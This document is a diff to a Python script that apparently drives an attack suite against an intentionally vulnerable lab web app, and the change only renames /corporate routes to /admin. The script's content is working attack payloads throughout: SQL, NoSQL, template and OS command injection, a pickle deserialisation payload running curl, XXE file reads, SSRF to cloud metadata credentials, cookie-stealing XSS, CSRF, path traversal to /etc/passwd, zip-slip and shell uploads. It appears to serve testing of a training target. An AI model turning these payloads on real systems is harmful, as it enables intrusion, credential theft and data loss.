@@ -41,17 +41,17 @@ def run():
     new().get(f"{BASE}/retail/track", params={"ref": "x' OR sleep(2)-- "})
     new().post(f"{BASE}/retail/cart/giftmessage", data={"message": "{{7*7}}"})
     # nosql login + search
-    new().post(f"{BASE}/corporate/api/login", json={"username": "admin", "password": {"$ne": None}})
+    new().post(f"{BASE}/admin/api/login", json={"username": "admin", "password": {"$ne": None}})
     new().post(f"{BASE}/api/v2/newsletter/find", json={"email": {"$regex": ".*"}})
     # os command (need corp session)
-    cs = new(); cs.post(f"{BASE}/corporate/login", data={"username": "admin", "password": "admin"})
-    cs.post(f"{BASE}/corporate/labels/generate", data={"filename": "x; echo SPRKLPWN"})
+    cs = new(); cs.post(f"{BASE}/admin/login", data={"username": "admin", "password": "admin"})
+    cs.post(f"{BASE}/admin/labels/generate", data={"filename": "x; echo SPRKLPWN"})
     # blind command injection (oast)
     tok = f"cmd-{int(time.time()*1000)}"
-    cs.post(f"{BASE}/corporate/tools/ping", data={"host": f"127.0.0.1; curl -s {BASE}/collab/{tok}"})
+    cs.post(f"{BASE}/admin/tools/ping", data={"host": f"127.0.0.1; curl -s {BASE}/collab/{tok}"})
     time.sleep(1.5)
     # ldap, xpath, crlf, smtp, orm, graphql-sqli, code-injection, ssti(done)
-    cs.get(f"{BASE}/corporate/directory", params={"u": "*"})
+    cs.get(f"{BASE}/admin/directory", params={"u": "*"})
     new().get(f"{BASE}/products/1/spec", params={"field": "*"})
     new().get(f"{BASE}/go/track", params={"next": "foo\r\nSet-Cookie: x=1"})
     new().post(f"{BASE}/contact", data={"email": "a@b.c\nBcc: evil@x.com", "subject": "s", "message": "m"})
@@ -69,8 +69,8 @@ def run():
     new().get(f"{BASE}/retail/orders/1001/invoice")
     new().get(f"{BASE}/retail/wishlist", params={"uid": "2"})
     new().get(f"{BASE}/api/v2/giftcards/2")
-    new().get(f"{BASE}/corporate/reports/financials")
-    new().get(f"{BASE}/corporate/public/..%2fadmin/console")
+    new().get(f"{BASE}/admin/reports/financials")
+    new().get(f"{BASE}/admin/public/..%2fadmin/console")
     new().post(f"{BASE}/api/v2/admin/users/2/role", json={"role": "admin"})   # bfla + logging gap
     requests.put(f"{BASE}/api/v2/admin/flags", json={"maintenance": "on"})
     new().post(f"{BASE}/api/v2/products/1", headers={"X-HTTP-Method-Override": "DELETE"})
@@ -95,7 +95,7 @@ def run():
     # weak session token
     new().get(f"{BASE}/retail/whoami", cookies={"remember": base64.b64encode(b"2:1").decode()})
     # mfa bypass
-    ms = new(); ms.post(f"{BASE}/corporate/mfa/begin"); ms.get(f"{BASE}/corporate/tools/mfa-skip")
+    ms = new(); ms.post(f"{BASE}/admin/mfa/begin"); ms.get(f"{BASE}/admin/tools/mfa-skip")
     # oauth redirect
     new().get(f"{BASE}/retail/oauth/authorize", params={"redirect_uri": "http://evil.example/cb"}, allow_redirects=False)
     # credential stuffing
@@ -111,11 +111,11 @@ def run():
             import os as _os
             return (_os.system, (f"curl -s {BASE}/collab/{ptok}",))
     blob = base64.b64encode(_pk.dumps(Ex())).decode()
-    cs.post(f"{BASE}/corporate/prefs/import", data={"prefs": blob}); time.sleep(1.0)
+    cs.post(f"{BASE}/admin/prefs/import", data={"prefs": blob}); time.sleep(1.0)
     # xxe import + svg
     flag = os.path.realpath(os.path.join(os.path.dirname(__file__), "..", "instance", "flag.txt"))
     xxe = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://{flag}">]><r>&x;</r>'
-    cs.post(f"{BASE}/corporate/inventory/import", data=xxe, headers={"Content-Type": "application/xml"})
+    cs.post(f"{BASE}/admin/inventory/import", data=xxe, headers={"Content-Type": "application/xml"})
     svg = f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file://{flag}">]><svg>&x;</svg>'.encode()
     new().post(f"{BASE}/retail/account/avatar", files={"file": ("a.svg", svg, "image/svg+xml")})
     # prototype pollution
@@ -127,8 +127,8 @@ def run():
     new().post(f"{BASE}/retail/account/avatar-from-url", data={"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"})
     new().post(f"{BASE}/retail/account/avatar-from-url", data={"url": "http://2852039166/latest/meta-data/iam/"})
     wtok = f"wh-{int(time.time()*1000)}"
-    cs.post(f"{BASE}/corporate/integrations/webhook/test", data={"url": "http://10.0.0.5/"})
-    cs.post(f"{BASE}/corporate/integrations/fx-sync", data={"upstream": "http://fx.internal/rates"})
+    cs.post(f"{BASE}/admin/integrations/webhook/test", data={"url": "http://10.0.0.5/"})
+    cs.post(f"{BASE}/admin/integrations/fx-sync", data={"upstream": "http://fx.internal/rates"})
     new().post(f"{BASE}/retail/reset/request", data={"email": "bob@example.com"}, headers={"Host": "evil.example"})
     # web cache deception + poisoning
     new().get(f"{BASE}/retail/account/profile.css")  # populate
@@ -154,7 +154,7 @@ def run():
     new().get(f"{BASE}/product/3")
     # blind xss contact (arm via contact, admin views inbox, beacon)
     new().post(f"{BASE}/contact", data={"email": "x@x.c", "subject": "s", "message": "<script>alert(document.cookie)</script>"})
-    cs.get(f"{BASE}/corporate/support/inbox")
+    cs.get(f"{BASE}/admin/support/inbox")
     # csrf change email
     rv.post(f"{BASE}/retail/account/email", data={"email": "attacker@evil.example"}, headers={"Origin": "http://evil.example"})
     # cors
@@ -173,9 +173,9 @@ def run():
     new().post(f"{BASE}/retail/account/avatar", data={"content_type": "image/png", "filename": "shell.php", "data": "x"})
     up = new(); up.post(f"{BASE}/retail/account/avatar", files={"file": ("shell.html", b"{{7*7}}", "text/html")})
     up.get(f"{BASE}/retail/uploads/shell.html")
-    cs.get(f"{BASE}/corporate/render", params={"theme": "../../../../etc/passwd"})
+    cs.get(f"{BASE}/admin/render", params={"theme": "../../../../etc/passwd"})
     zbuf = io.BytesIO(); z = zipfile.ZipFile(zbuf, "w"); z.writestr("../evil.txt", "x"); z.close()
-    cs.post(f"{BASE}/corporate/inventory/import-zip", files={"file": ("a.zip", zbuf.getvalue(), "application/zip")})
+    cs.post(f"{BASE}/admin/inventory/import-zip", files={"file": ("a.zip", zbuf.getvalue(), "application/zip")})
 
     # ---------- 09 BUSINESS LOGIC ----------
     new().post(f"{BASE}/retail/cart/update", data={"qty": "-5"})
@@ -211,7 +211,7 @@ def run():
 
     # ---------- 11 CONFIG ----------
     new().get(f"{BASE}/debug")
-    new().post(f"{BASE}/corporate/login", data={"username": "admin", "password": "admin"})
+    new().post(f"{BASE}/admin/login", data={"username": "admin", "password": "admin"})
     new().get(f"{BASE}/api/v2/echo", params={"n": "abc"})
     new().get(f"{BASE}/audit/security-headers")
     new().get(f"{BASE}/status"); new().get(f"{BASE}/api/v2/advisory", params={"q": "SPRKL-CANARY-CVE-2021-9999"})
